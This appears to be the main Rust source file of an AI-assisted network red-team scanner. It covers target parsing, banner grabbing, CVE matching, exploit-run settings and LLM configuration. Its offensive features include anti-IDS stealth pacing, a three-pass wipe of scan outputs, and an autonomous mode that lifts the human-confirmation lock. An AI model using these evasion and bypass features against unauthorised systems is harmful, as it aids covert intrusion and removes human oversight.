/// directory (covers the common `target/release/` layout where configs live at
/// the project root). Returns the original path if nothing is found so the
/// caller's error message stays accurate.
pub(crate) fn resolve_config_path(given: &str) -> String {
    let p = std::path::Path::new(given);
    if p.exists() {
        return given.to_string();
    }
    // Only fall back for bare filenames; respect explicit relative/absolute paths.
    let is_bare = p.parent().map_or(true, |par| par.as_os_str().is_empty());
    if !is_bare {
        return given.to_string();
    }
    if let Ok(exe) = std::env::current_exe() {
        let mut dir = exe.parent().map(|d| d.to_path_buf());
        let mut depth = 0u8;
        while let Some(d) = dir.take() {
            let candidate = d.join(given);
            if candidate.exists() {
                return candidate.to_string_lossy().into_owned();
            }
            if depth >= 3 {
                break;
            }
            dir = d.parent().map(|pd| pd.to_path_buf());
            depth += 1;
        }
    }
    given.to_string()
}

/// Charge les variables d'environnement depuis un fichier `.env`.
///
/// `dotenvy::dotenv()` ne cherche que dans le CWD et ses parents : un binaire
/// lancé depuis un répertoire hors de l'arborescence du projet (layout
/// `target/{debug,release}/`, build déployé, `~/nrtg-target/debug`) ne trouvait
/// donc pas le `.env` du projet et échouait sur « Clé API manquante » alors que
/// le secret était bien présent sur la machine.
///
/// Ordre de recherche, le premier fichier trouvé gagne :
///   1. CWD puis ses parents (comportement standard `dotenvy`)
///   2. répertoire de l'exécutable puis 3 niveaux au-dessus
///   3. répertoire du `config.json` résolu
///
/// Les variables déjà définies dans l'environnement ne sont jamais écrasées.
fn load_env_files(config_path: &str) {
    if dotenvy::dotenv().is_ok() {
        return;
    }

    let mut candidates: Vec<std::path::PathBuf> = Vec::new();

    if let Ok(exe) = std::env::current_exe() {
        let mut dir = exe.parent().map(|d| d.to_path_buf());
        let mut depth = 0u8;
        while let Some(d) = dir.take() {
            candidates.push(d.join(".env"));
            if depth >= 3 {
                break;
            }
            dir = d.parent().map(|pd| pd.to_path_buf());
            depth += 1;
        }
    }

    if let Some(parent) = std::path::Path::new(config_path).parent() {
        if !parent.as_os_str().is_empty() {
            candidates.push(parent.join(".env"));
        }
    }

    for candidate in candidates {
        if candidate.is_file() {
            let _ = dotenvy::from_path(&candidate);
            return;
        }
    }
}

fn parse_target(raw: &str) -> Result<(String, String, String, u16, bool)> {
    if raw.starts_with("http://") || raw.starts_with("https://") {
        let url = Url::parse(raw).map_err(|e| anyhow!("Invalid URL '{}': {}", raw, e))?;
        let scheme = url.scheme().to_string();
        let host = url
            .host_str()
            .ok_or_else(|| anyhow!("No host in URL: {}", raw))?
            .to_string();
        let port = url
            .port_or_known_default()
            .ok_or_else(|| anyhow!("No port for URL: {}", raw))?;
        Ok((host.clone(), scheme.clone(), host, port, true))
    } else {
        // Support bare hostname/domain (no port) → probe both HTTP/80 and HTTPS/443.
        // Determine if the last ':'-delimited segment is a numeric port.
        let has_valid_port = raw
            .rsplit_once(':')
            .map(|(_, p)| {
                !p.is_empty()
                    && p.chars().all(|c| c.is_ascii_digit())
                    && p.parse::<u16>().ok().filter(|&v| v != 0).is_some()
            })
            .unwrap_or(false);
        if !has_valid_port {
            let host = raw.to_string();
            // Bare domain/ip without port → treat as https/443 primary, http/80 fallback.
            return Ok((host.clone(), "https".into(), host, 443, true));
        }
        let parts: Vec<&str> = raw.rsplitn(2, ':').collect();
        if parts.len() != 2 {
            return Err(anyhow!(
                "Invalid target format '{}'. Expected host:port or URL",
                raw
            ));
        }
        let host = parts[1].to_string();
        let port: u16 = parts[0]
            .parse()
            .map_err(|_| anyhow!("Invalid port in target '{}'", raw))?;
        if port == 0 {
            return Err(anyhow!("Invalid port 0 in target '{}'", raw));
        }
        let http_ports = [80u16, 8080, 8000, 3000, 8008, 8888, 8081, 8082, 9090, 8025];
        let https_ports = [443u16, 8443, 9443];
        if https_ports.contains(&port) {
            Ok((host.clone(), "https".into(), host, port, true))
        } else if http_ports.contains(&port) {
            Ok((host.clone(), "http".into(), host, port, true))
        } else {
            Ok((host.clone(), "tcp".into(), host, port, false))
        }
    }
}

fn expand_target(target: &str) -> Vec<String> {
    let raw = target.trim();
    if raw.is_empty() {
        return vec![];
    }

    // CIDR natif : 192.168.1.0/24:22 ou 10.0.0.0/24 (port 0 = scan ports communs)
    if let Some((cidr_part, port_part)) = raw.split_once('/') {
        // Vérifier si c'est bien un CIDR (contient un '/' suivi d'un préfixe numérique)
        let (prefix_len_str, port_opt) = if port_part.contains(':') {
            port_part.split_once(':').unwrap_or((port_part, ""))
        } else {
            (port_part, "")
        };
        let port_opt = if port_opt.is_empty() {
            None
        } else {
            Some(port_opt)
        };

        if prefix_len_str.chars().all(|c| c.is_ascii_digit()) {
            let cidr = format!("{}/{}", cidr_part, prefix_len_str);
            if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
                // Compter les hôtes de façon compatible avec NetworkSize
                let host_count: u64 = match net {
                    ipnetwork::IpNetwork::V4(ref v4net) => 2u64.pow(32 - v4net.prefix() as u32),
                    ipnetwork::IpNetwork::V6(ref v6net) => {
                        let bits = 128 - v6net.prefix() as u32;
                        if bits >= 64 {
                            u64::MAX
                        } else {
                            2u64.pow(bits)
                        }
                    }
                };
                // Limiter à /24 max (256 hôtes) pour éviter les scans trop larges
                if host_count <= 256 {
                    let port = port_opt.and_then(|p| p.parse::<u16>().ok()).unwrap_or(0);
                    return net
                        .iter()
                        .filter(|ip| {
                            // Exclure adresse réseau et broadcast pour IPv4
                            if let std::net::IpAddr::V4(v4) = ip {
                                let oct = v4.octets()[3];
                                oct != 0 && oct != 255
                            } else {
                                true
                            }
                        })
                        .map(|ip| {
                            if port > 0 {
                                format!("{}:{}", ip, port)
                            } else {
                                // Port 0 → ports communs
                                format!("{}:80", ip)
                            }
                        })
                        .collect();
                } else {
                    eprintln!(
                        "⚠️  CIDR {} trop large ({} hôtes > 256) — utilisez /24 ou plus petit",
                        cidr, host_count
                    );
                    return vec![];
                }
            }
        }
    }

    // Bare host/IP (no scheme, no port, no CIDR) → probe BOTH HTTP/80 and HTTPS/443.
    // Previously only 443 was probed, missing services listening on port 80.
    if !raw.contains(':') && !raw.contains('/') {
        return vec![format!("{}:80", raw), format!("{}:443", raw)];
    }

    if let Ok((_, _, host, port, is_http)) = parse_target(raw) {
        if port == 0 && host.contains('/') {
            return vec![raw.to_string()];
        }
        if !is_http && host.contains('-') {
            if let Some((start_s, end_s)) = host.split_once('-') {
                if let (Ok(s), Ok(e)) = (start_s.parse::<u16>(), end_s.parse::<u16>()) {
                    if (start_s.len() <= 3 && end_s.len() <= 3) && (e > s) && (e - s < 256) {
                        return (s..=e).map(|p| format!("{}:{}", host.clone(), p)).collect();
                    }
                }
            }
        }
    }
    vec![raw.to_string()]
}

fn parse_depth(s: &str) -> exploits::ExploitDepth {
    use exploits::ExploitDepth::*;
    match s.to_ascii_lowercase().as_str() {
        "light" | "shallow" | "1" => Light,
        "medium" | "mid" | "2" => Medium,
        "deep" | "full" | "3" => Deep,
        _ => Medium,
    }
}

fn parse_provider(s: &str) -> LlmProvider {
    match s.to_ascii_lowercase().as_str() {
        "openai" | "open-ai" | "oai" => LlmProvider::OpenAi,
        "openrouter" | "open-router" | "or" | "nemotron" | "nvidia" => LlmProvider::OpenRouter,
        "ollama" | "local" | "llama" => LlmProvider::Ollama,
        // Défaut 2026 : OpenRouter pour accéder à Nemotron 3 Ultra 550B
        _ => LlmProvider::OpenRouter,
    }
}

fn default_api_base(provider: LlmProvider) -> &'static str {
    match provider {
        LlmProvider::OpenAi => "https://api.openai.com/v1",
        LlmProvider::OpenRouter => "https://openrouter.ai/api/v1",
        LlmProvider::Ollama => "http://localhost:11434",
    }
}

fn load_config_effective(
    cli: &Cli,
) -> (
    Vec<String>,
    RiskRules,
    CveDatabase,
    Option<Vec<FlowLink>>,
    bool,
    bool,
    CaptureConfig,
    RuntimeConfig,
) {
    let config_path = resolve_config_path(&cli.config);
    let (cfg_targets, cfg_opt) = if std::path::Path::new(&config_path).exists() {
        match fs::read_to_string(&config_path)
            .and_then(|s| serde_json::from_str::<ConfigFile>(&s).map_err(Into::into))
        {
            Ok(cfg) => (cfg.targets, cfg.options),
            Err(e) => {
                eprintln!(
                    "⚠️  Config parse error ({}): {}. Using CLI/defaults.",
                    config_path, e
                );
                (None, None)
            }
        }
    } else {
        (None, None)
    };
    let cfg_opt = cfg_opt.unwrap_or_default();

    let http_t = clamp_timeout(
        cfg_opt.http_timeout.unwrap_or(cli.http_timeout),
        cli.min_timeout,
        cli.max_timeout,
    );
    let tcp_t = clamp_timeout(
        cfg_opt.tcp_timeout.unwrap_or(cli.tcp_timeout),
        cli.min_timeout,
        cli.max_timeout,
    );
    let _ = (http_t, tcp_t);

    let cve_path = resolve_config_path(&cfg_opt.cve_db_path.unwrap_or_else(|| cli.cve_db.clone()));
    let risk_path = resolve_config_path(
        &cfg_opt
            .risk_rules_path
            .unwrap_or_else(|| cli.risk_rules.clone()),
    );
    let flows_files = cli.flows.clone().or(cfg_opt.flows_file);
    let csv = cli.csv.or(cfg_opt.csv_report).unwrap_or(false);
    let md = cli.md.or(cfg_opt.md_report).unwrap_or(false);
    let cap_cfg = CaptureConfig {
        iface: cli.capture_iface.clone().or(cfg_opt.capture_iface),
        duration: cli
            .capture_duration
            .or(cfg_opt.capture_duration)
            .unwrap_or(30),
        output: cli.capture_output.clone().or(cfg_opt.capture_output),
        max_flows: cli
            .capture_max_flows
            .or(cfg_opt.capture_max_flows)
            .unwrap_or(10000),
        capture_all: cli.capture_all.or(cfg_opt.capture_all).unwrap_or(false),
        promiscuous: cli.promiscuous.or(cfg_opt.promiscuous).unwrap_or(false),
        bpf_filter: cli.capture_bpf.clone().or(cfg_opt.capture_bpf),
    };

    let log_level = cli
        .log_level
        .clone()
        .or(cfg_opt.log_level)
        .unwrap_or_else(|| "info".into());
    let log_format = cli
        .log_format
        .clone()
        .or(cfg_opt.log_format)
        .unwrap_or_else(|| "compact".into());
    let log_file = cli.log_file.clone().or(cfg_opt.log_file);

    let exploits_path = resolve_config_path(
        &cfg_opt
            .exploits_config
            .unwrap_or_else(|| cli.exploits_config.clone()),
    );
    let run_exploits = cli.run_exploits.or(cfg_opt.run_exploits).unwrap_or(false);
    let depth_s = cli
        .exploit_depth
        .clone()
        .or(cfg_opt.exploit_depth)
        .unwrap_or_else(|| "medium".into());
    let allow_networks = cli.allow_networks.clone().or(cfg_opt.allow_networks);
    let impact_s = cli
        .max_exploit_impact
        .clone()
        .or(cfg_opt.max_exploit_impact)
        .unwrap_or_else(|| "informational".into());
    let max_impact = impact_s
        .parse::<exploits::ImpactLevel>()
        .unwrap_or(exploits::ImpactLevel::Informational);
    let pentest = PentestConfig {
        dry_run: !run_exploits,
        max_parallel: 4,
        request_timeout: std::time::Duration::from_millis(3500),
        retries: 1,
        exploit_depth: parse_depth(&depth_s),
        max_exploit_impact: max_impact,
        allowed_target_networks: allow_networks.map(|v| {
            v.into_iter()
                .filter_map(|s| s.parse::<ipnetwork::IpNetwork>().ok())
                .collect()
        }),
    };

    // ── Défauts 2026 : NVIDIA Nemotron 3 Ultra 550B via OpenRouter ────────────
    // Priorité : --llm-provider > config.json > NRTG_LLM_PROVIDER (.env) > défaut.
    // Le repli env manquait : `NRTG_LLM_PROVIDER=ollama` (documenté dans
    // .env.example et lu par l'agent + le planner) était ignoré ici, si bien que
    // le pré-vol de --ai-agent réclamait une clé OpenRouter pour une exécution
    // pourtant 100 % locale.
    let provider_from_explicit = cli.llm_provider.is_some() || cfg_opt.llm_provider.is_some();
    let llm_provider_s = cli
        .llm_provider
        .clone()
        .or(cfg_opt.llm_provider)
        .or_else(|| std::env::var("NRTG_LLM_PROVIDER").ok())
        .unwrap_or_else(|| "openrouter".into());
    // `NRTG_LLM_PROVIDER` est documenté pour l'agent, mais CLI/config.json
    // restent prioritaires. Un opérateur qui force un provider local (Ollama :
    // aucune exfiltration) doit voir que sa configuration l'emporte, sinon la
    // substitution d'un provider cloud se fait en silence.
    if provider_from_explicit {
        if let Ok(env_provider) = std::env::var("NRTG_LLM_PROVIDER") {
            if !env_provider.eq_ignore_ascii_case(&llm_provider_s) {
                eprintln!("  \x1b[33m[WARN]\x1b[0m NRTG_LLM_PROVIDER={} ignoré : {} retenu (--llm-provider/config.json prioritaire)",
                    env_provider, llm_provider_s);
            }
        }
    }
    let llm_provider = parse_provider(&llm_provider_s);
    // Modèle par défaut adapté au provider : Nemotron si OpenRouter/Ollama, sinon GPT pour OpenAI
    let default_model_for_provider = match llm_provider {
        LlmProvider::OpenRouter => "nvidia/nemotron-3-ultra-550b-a55b:free",
        LlmProvider::Ollama => "nemotron:70b-instruct-q4_K_M",
        LlmProvider::OpenAi => "gpt-4o-mini",
    };
    let llm_model = cli
        .llm_model
        .clone()
        .or(cfg_opt.llm_model)
        .or_else(|| std::env::var("NRTG_LLM_MODEL").ok())
        .unwrap_or_else(|| default_model_for_provider.into());
    let llm_api_base = cli
        .llm_api_base
        .clone()
        .or(cfg_opt.llm_api_base)
        .unwrap_or_else(|| default_api_base(llm_provider).into());
    let llm_key_env = cli.llm_api_key_env.clone().or(cfg_opt.llm_api_key_env);
    let api_key = match llm_provider {
        LlmProvider::Ollama => None,
        LlmProvider::OpenAi | LlmProvider::OpenRouter => {
            let env_var = llm_key_env.unwrap_or_else(|| match llm_provider {
                LlmProvider::OpenRouter => "OPENROUTER_API_KEY".into(),
                _ => "OPENAI_API_KEY".into(),
            });
            std::env::var(&env_var).ok()
        }
    };
    let do_ai = cfg_opt.ai_report.unwrap_or(cli.ai_report);
    // L'agent autonome (--ai-agent) consomme `runtime.llm` : sans `--ai-report`
    // la config LLM n'était pas construite et l'agent retombait sur un fallback
    // qui ignorait --llm-provider/--llm-model/--llm-api-base et n'acceptait que
    // OPENROUTER_API_KEY, d'où « Clé API manquante » et modèle non respecté.
    let llm_cfg = if do_ai || cli.ai_agent {
        // Calibrage temporel spécifique Nemotron : basse température = JSON strict
        let (temp, top_p, max_tokens, timeout_s, retries) = match llm_provider {
            LlmProvider::Ollama => (0.1f32, 0.90f32, 6144u32, 300u64, 3u32), // Ollama local : plus lent, + de tokens
            LlmProvider::OpenRouter => (0.1f32, 0.90f32, 4096u32, 120u64, 4u32), // Nemotron 3 Ultra 550B : 4K tokens sortie, timeout 120s
            LlmProvider::OpenAi => (0.2f32, 0.95f32, 2048u32, 60u64, 3u32),
        };
        Some(LlmConfig {
            provider: llm_provider,
            model: llm_model,
            api_base: llm_api_base,
            api_key,
            temperature: temp,
            top_p,
            max_tokens,
            timeout: std::time::Duration::from_secs(timeout_s),
            retries,
            json_mode: true,
        })
    } else {
        None
    };
    let ai_targets = cfg_opt.ai_targets.unwrap_or(cli.ai_targets);
    let do_api_report = cfg_opt.export_api_report.unwrap_or(cli.export_api_report);

    let runtime = RuntimeConfig {
        logging: config::LoggingConfig {
            level: log_level,
            format: log_format,
            file: log_file,
            rotate: false,
            max_size_mb: 100,
            keep_files: 5,
        },
        pentest,
        exploits_path,
        llm: llm_cfg,
        do_ai,
        ai_targets,
        do_api_report,
    };

    let cli_targets_final = cli.targets.clone().unwrap_or_default();
    let final_targets = if !cli_targets_final.is_empty() {
        cli_targets_final
            .into_iter()
            .flat_map(|t| expand_target(&t))
            .collect()
    } else if let Some(ct) = cfg_targets {
        ct.into_iter().flat_map(|t| expand_target(&t)).collect()
    } else {
        vec![
            "http://localhost:8080".into(),
            "http://localhost:3000".into(),
            "127.0.0.1:6379".into(),
            "127.0.0.1:2222".into(),
            "127.0.0.1:1025".into(),
            "127.0.0.1:21".into(),
        ]
    };

    let risk_rules = load_risk_rules(&risk_path).unwrap_or_else(|e| {
        eprintln!(
            "⚠️  Could not load risk rules ({}): {} — using defaults",
            risk_path, e
        );
        default_risk_rules()
    });
    let cve_db = load_cve_db(&cve_path).unwrap_or_else(|e| {
        eprintln!(
            "⚠️  Could not load CVE DB ({}): {} — scanning without CVE matching",
            cve_path, e
        );
        Default::default()
    });
    let captured_links = flows_files.and_then(|files| {
        let mut all = Vec::new();
        for f in &files {
            if let Some(l) = load_flows_json(f) {
                all.extend(l);
            }
        }
        if all.is_empty() {
            None
        } else {
            Some(all)
        }
    });

    (
        final_targets,
        risk_rules,
        cve_db,
        captured_links,
        csv,
        md,
        cap_cfg,
        runtime,
    )
}

// ---------------------------------------------------------------
// Per-target scan
// ---------------------------------------------------------------

async fn scan_single_target(
    raw: &str,
    cve_db: &CveDatabase,
    risk_rules: &RiskRules,
    http_t: u64,
    tcp_t: u64,
    verify_tls_flag: bool,
) -> Option<(GraphNode, ScanTargetSummary)> {
    let (id, protocol, host, port, is_http) = match parse_target(raw) {
        Ok(p) => p,
        Err(e) => {
            scan_error!(target=%raw, err=%e, "skipping target");
            return None;
        }
    };
    let label = format!("Host {}:{} ({})", host, port, protocol);
    let result = if is_http {
        let url = if raw.starts_with("http://") || raw.starts_with("https://") {
            raw.to_string()
        } else {
            let scheme = if protocol == "https" { "https" } else { "http" };
            format!("{}://{}:{}", scheme, host, port)
        };
        match grab_http_banner(&url, http_t, verify_tls_flag).await {
            Ok(b) => b,
            Err(e) => {
                scan_warn!(target=%raw, err=%e, "HTTP banner failed");
                let svc = if port == 443 || raw.starts_with("https://") {
                    "https"
                } else {
                    "http"
                }
                .into();
                BannerResult {
                    banner: None,
                    content_type: None,
                    service_name: svc,
                    headers: HashMap::new(),
                    http_status: None,
                    page_title: None,
                    dns_validated: false,
                    silent_port: false,
                    tls_info: None,
                }
            }
        }
    } else {
        match grab_tcp_banner(&host, port, tcp_t).await {
            Ok(b) => b,
            Err(e) => {
                scan_warn!(host=%host, port, err=%e, "TCP banner failed");
                BannerResult {
                    banner: None,
                    content_type: None,
                    service_name: port_to_service(port).into(),
                    headers: HashMap::new(),
                    http_status: None,
                    page_title: None,
                    dns_validated: false,
                    silent_port: false,
                    tls_info: None,
                }
            }
        }
    };
    let reachable = !result.silent_port
        && result.dns_validated
        && (result.banner.is_some()
            || result.http_status.is_some()
            || result.service_name == "http"
            || result.service_name == "https");
    let BannerResult {
        banner,
        service_name,
        headers,
        http_status,
        page_title,
        ..
    } = result;
    let version_info = banner
        .as_deref()
        .and_then(|b| extract_version(b, &protocol));
    let (product, version) = match &version_info {
        Some(vi) => (vi.product.clone(), vi.version.clone()),
        None => {
            let p = match service_name.as_str() {
                "mysql" => "mysql",
                "postgresql" => "postgresql",
                "mongodb" => "mongodb",
                "mssql" => "mssql",
                "redis" => "redis",
                "telnet" => "telnet",
                "dns" => "bind",
                "ssh" => "openssh",
                "ftp" => "vsftpd",
                "smtp" => "postfix",
                "smb" => "smb",
                "rdp" => "rdp",
                "ldap" => "ldap",
                "elasticsearch" => "elasticsearch",
                "memcached" => "memcached",
                "rabbitmq" => "rabbitmq",
                "docker-api" => "docker",
                _ => "unknown",
            }
            .to_string();
            (p, "unknown".to_string())
        }
    };
    let services = vec![format!("{}/{}", service_name, port)];
    let cves = find_cves_for_version(cve_db, &product, &version);
    let cve_max_sev = cves.iter().map(|c| c.1).fold(0.0f32, f32::max);
    let (risk, risk_reasons) = evaluate_risk(
        risk_rules,
        &protocol,
        Some(&service_name),
        banner.as_deref(),
        Some(&product),
        cves.len(),
        cve_max_sev,
    );
    let summary = ScanTargetSummary {
        id: id.clone(),
        host: host.clone(),
        port,
        service: service_name.clone(),
        risk,
    };

    // Store the headers on the node for later enrichment (we use a thread-local trick: attach them
    // in the extra map after the scan, keyed by node id). For now pass them up via the banner string.
    // The node extras are populated in `enrich_extras` which runs after this and can access banners.
    let _ = (headers, http_status, page_title); // consumed by enrich_extras via node banner

    Some((
        GraphNode {
            id,
            label,
            risk,
            services,
            banner: banner.unwrap_or_else(|| "unknown".into()),
            version,
            protocol,
            product,
            cves,
            risk_reasons,
            host,
            port,
            reachable,
            ..Default::default()
        },
        summary,
    ))
}

// ---------------------------------------------------------------
// Extended per-node enhanced info (WAF / OS / Tech) cached
// ---------------------------------------------------------------

#[derive(Debug, Clone, Default, Serialize)]
struct NodeExtra {
    waf: Option<String>,
    waf_confidence: f32,
    os_guess: Option<String>,
    os_confidence: f32,
    tech_stack: Option<String>,
    http_headers: HashMap<String, String>,
    ttl: Option<u32>,
}

// ── QW1: Stealth scan pacing tiers (OPSEC anti-IDS) ──────────────────────────
#[derive(Debug, Clone)]
struct StealthCfg {
    max_concurrency: usize,
    jitter_min_ms: u64,
    jitter_max_ms: u64,
    label: &'static str,
}

impl StealthCfg {
    fn from_str(s: &str) -> Self {
        match s.to_ascii_lowercase().as_str() {
            "off" | "none" | "fast" | "loud" => Self {
                max_concurrency: 64,
                jitter_min_ms: 0,
                jitter_max_ms: 0,
                label: "OFF (full blast)",
            },
            "redteam" | "stealth" | "opsec" | "low" => Self {
                max_concurrency: 1,
                jitter_min_ms: 80,
                jitter_max_ms: 400,
                label: "REDTEAM (low & slow)",
            },
            _ => Self {
                max_concurrency: 8,
                jitter_min_ms: 5,
                jitter_max_ms: 20,
                label: "DEFAULT (balanced)",
            },
        }
    }
}

fn shuffle_with_seed_rt<T>(items: &mut [T], seed: u64) {
    let n = items.len();
    if n < 2 {
        return;
    }
    let mut state = if seed == 0 {
        0x1234_5678_9ABC_DEF0
    } else {
        seed
    };
    for i in (1..n).rev() {
        let mut x = state;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        state = if x == 0 { 0x9E37_79B9_7F4A_7C15 } else { x };
        let r1 = (state >> 32) as u32;
        x = state;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        state = if x == 0 { 0x9E37_79B9_7F4A_7C15 } else { x };
        let r2 = (state >> 32) as u32;
        let j = ((r1 as u64) << 32 | r2 as u64) as usize % (i + 1);
        items.swap(i, j);
    }
}

// ── QW3: AI Redaction tiers + anonymizer (OPSEC before LLM upload) ───────────
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum RedactLevel {
    #[default]
    Off,
    Light,
    Strict,
}

impl RedactLevel {
    fn from_str(s: &str) -> Self {
        match s.to_ascii_lowercase().as_str() {
            "off" | "none" | "disable" | "0" => Self::Off,
            "light" | "minimal" | "soft" | "1" => Self::Light,
            _ => Self::Strict,
        }
    }
}

#[derive(Debug, Clone, Default)]
struct Anonymizer {
    hosts: HashMap<String, String>,
    netbios: HashMap<String, String>,
    accounts: HashMap<String, String>,
    domains: HashMap<String, String>,
    level: RedactLevel,
}

impl Anonymizer {
    fn new(level: RedactLevel) -> Self {
        Self {
            level,
            ..Default::default()
        }
    }

    fn short_hash(s: &str, prefix: &str) -> String {
        use std::hash::{DefaultHasher, Hasher};
        let mut h = DefaultHasher::new();
        h.write(prefix.as_bytes());
        h.write(s.as_bytes());
        let hex = format!("{:05x}", h.finish());
        format!("<{}-{}>", prefix, &hex[..hex.len().min(6)])
    }

    fn redact_host(&mut self, host: &str) -> String {
        if matches!(self.level, RedactLevel::Off) {
            return host.to_string();
        }
        if let Ok(ip) = host.parse::<std::net::IpAddr>() {
            if ip.is_loopback() || ip.is_unspecified() {
                return host.to_string();
            }
        }
        let key = host.to_lowercase();
        if let Some(v) = self.hosts.get(&key) {
            return v.clone();
        }
        let tag = Self::short_hash(host, "HOST");
        self.hosts.insert(key, tag.clone());
        tag
    }

    fn redact_netbios(&mut self, name: &str) -> String {
        if matches!(self.level, RedactLevel::Off) {
            return name.to_string();
        }
        let key = name.to_lowercase();
        if let Some(v) = self.netbios.get(&key) {
            return v.clone();
        }
        let tag = Self::short_hash(name, "NETBIOS");
        self.netbios.insert(key, tag.clone());
        tag
    }

    fn redact_account(&mut self, acct: &str) -> String {
        if matches!(self.level, RedactLevel::Off | RedactLevel::Light) {
            return acct.to_string();
        }
        let key = acct.to_lowercase();
        if let Some(v) = self.accounts.get(&key) {
            return v.clone();
        }
        let tag = Self::short_hash(acct, "ACCT");
        self.accounts.insert(key, tag.clone());
        tag
    }

    fn redact_domain(&mut self, domain: &str) -> String {
        if matches!(self.level, RedactLevel::Off | RedactLevel::Light) {
            return domain.to_string();
        }
        let key = domain.to_lowercase();
        if let Some(v) = self.domains.get(&key) {
            return v.clone();
        }
        let tag = Self::short_hash(domain, "DOMAIN");
        self.domains.insert(key, tag.clone());
        tag
    }

    // Motifs regex **littéraux** : compilation infaillible (couvert par tests).
    #[allow(clippy::unwrap_used)]
    fn anonymize_text(&mut self, text: &str) -> String {
        if matches!(self.level, RedactLevel::Off) {
            return text.to_string();
        }
        let mut out = text.to_string();

        if matches!(self.level, RedactLevel::Strict) {
            let ip_re = regex::Regex::new(r"\b(?:\d{1,3}\.){3}\d{1,3}\b").unwrap();
            let ips: Vec<String> = ip_re
                .find_iter(&out)
                .map(|m| m.as_str().to_string())
                .collect();
            for ip in ips {
                if let Ok(addr) = ip.parse::<std::net::Ipv4Addr>() {
                    if !addr.is_loopback() && !addr.is_unspecified() {
                        let masked = self.redact_host(&ip);
                        out = out.replace(&ip, &masked);
                    }
                }
            }

            let fqdn_re = regex::Regex::new(r"\b(?:[a-zA-Z0-9-]+\.){2,}[a-zA-Z]{2,}\b").unwrap();
            let fqdns: Vec<String> = fqdn_re
                .find_iter(&out)
                .map(|m| m.as_str().to_string())
                .collect();
            for f in fqdns {
                let masked = self.redact_domain(&f);
                out = out.replace(&f, &masked);
            }
        } else {
            let ip_re = regex::Regex::new(
                r"\b(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)(?:\d{1,3}\.){1,2}\d{1,3}\b",
            )
            .unwrap();
            let ips: Vec<String> = ip_re
                .find_iter(&out)
                .map(|m| m.as_str().to_string())
                .collect();
            for ip in ips {
                let masked = self.redact_host(&ip);
                out = out.replace(&ip, &masked);
            }
        }

        let nb_re = regex::Regex::new(
            r"\b([A-Z]{2,15}-[A-Z0-9]{2,15}|DC-[A-Z0-9]+|SRV-[A-Z0-9]+|PROD-[A-Z0-9]+)\b",
        )
        .unwrap();
        let nbs: Vec<String> = nb_re
            .find_iter(&out)
            .map(|m| m.as_str().to_string())
            .collect();
        for n in nbs {
            let masked = self.redact_netbios(&n);
            out = out.replace(&n, &masked);
        }

        out
    }
}

// ── QW4: Secure wipe (3-pass overwrite + remove) ─────────────────────────────
fn secure_wipe_file(path: &std::path::Path) -> Result<()> {
    use rand::RngCore;
    use std::io::{Seek, SeekFrom, Write};

    let metadata = match std::fs::metadata(path) {
        Ok(m) if m.is_file() => m,
        _ => return Ok(()),
    };
    let file_size = metadata.len();
    if file_size == 0 {
        let _ = std::fs::remove_file(path);
        return Ok(());
    }

    let mut f = std::fs::OpenOptions::new()
        .write(true)
        .open(path)
        .with_context(|| format!("open for wipe: {}", path.display()))?;

    let mut rng = rand::thread_rng();
    let mut buf = vec![0u8; (file_size as usize).min(64 * 1024)];

    for pass in 0u8..3 {
        f.seek(SeekFrom::Start(0))?;
        let mut remaining = file_size;
        while remaining > 0 {
            let chunk = remaining.min(buf.len() as u64) as usize;
            match pass {
                0 => {
                    for b in &mut buf[..chunk] {
                        *b = 0x00;
                    }
                }
                1 => {
                    for b in &mut buf[..chunk] {
                        *b = 0xFF;
                    }
                }
                _ => {
                    rng.fill_bytes(&mut buf[..chunk]);
                }
            }
            f.write_all(&buf[..chunk])?;
            remaining -= chunk as u64;
        }
        f.flush()?;
        let _ = f.sync_all();
    }
    drop(f);
    let _ = std::fs::remove_file(path);
    Ok(())
}

fn collect_output_files(graph_out: &str) -> Vec<std::path::PathBuf> {
    let out_path = std::path::Path::new(graph_out);
    let mut files = Vec::new();
    if out_path.exists() {
        files.push(out_path.to_path_buf());
    }

    let extras = sibling_path(graph_out, "extras.json");
    let api = sibling_path(graph_out, "api.json");
    let csv = sibling_path(graph_out, "csv");
    let md = sibling_path(graph_out, "md");
    let report = sibling_path(graph_out, "report.html");
    let ai_report = sibling_path(graph_out, "ai-report.md");
    let pt_md = sibling_path(graph_out, "pentest.md");
    let pt_html = sibling_path(graph_out, "pentest.html");

    for cand in [extras, api, csv, md, report, ai_report, pt_md, pt_html] {
        let p = std::path::Path::new(&cand);
        if p.exists() {
            files.push(p.to_path_buf());
        }
    }

    if let Some(parent) = out_path.parent() {
        if let Ok(rd) = std::fs::read_dir(parent) {
            let stem_prefix = out_path
                .file_stem()
                .and_then(|s| s.to_str())
                .unwrap_or("graph");
            for entry in rd.flatten() {
                let ep = entry.path();
                if let Some(name) = ep.file_name().and_then(|n| n.to_str()) {
                    if name.starts_with(stem_prefix) && ep.is_file() && !files.contains(&ep) {
                        files.push(ep);
                    }
                }
            }
        }
    }

    files
}

fn secure_wipe_outputs(graph_out: &str) -> Result<usize> {
    let files = collect_output_files(graph_out);
    let mut wiped = 0usize;
    for f in &files {
        match secure_wipe_file(f) {
            Ok(()) => wiped += 1,
            Err(e) => eprintln!("  ⚠️  wipe {}: {}", f.display(), e),
        }
    }
    Ok(wiped)
}

// ---------------------------------------------------------------
// MAIN
// ---------------------------------------------------------------

fn main() -> Result<()> {
    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()?;
    rt.block_on(real_main())
}

async fn real_main() -> Result<()> {
    load_env_files(&resolve_config_path("config.json"));
    if handle_pre_parse_args() {
        return Ok(());
    }
    let start = Instant::now();
    let mut cli = Cli::parse();
    // Mode autonome : exécution non-interactive complète. Il implique
    // l'installation automatique et le consentement implicite, et lève le
    // verrou de confirmation humaine du module d'installation.
    if cli.autonomous {
        cli.auto_install = true;
        cli.yes = true;
    }
    crate::installer::set_autonomous(cli.autonomous);
    // Un `-c` explicite peut désigner un projet dont le .env est ailleurs : on
    // complète une fois le chemin connu (les variables déjà définies gagnent).
    if cli.config != "config.json" {
        load_env_files(&resolve_config_path(&cli.config));
    }

    // ── --oob-bind : écouteur OOB intégré (confirmation des vulns aveugles) ──
    if let Some(ref bind) = cli.oob_bind {
        let host = cli.oob_host.clone().unwrap_or_default();
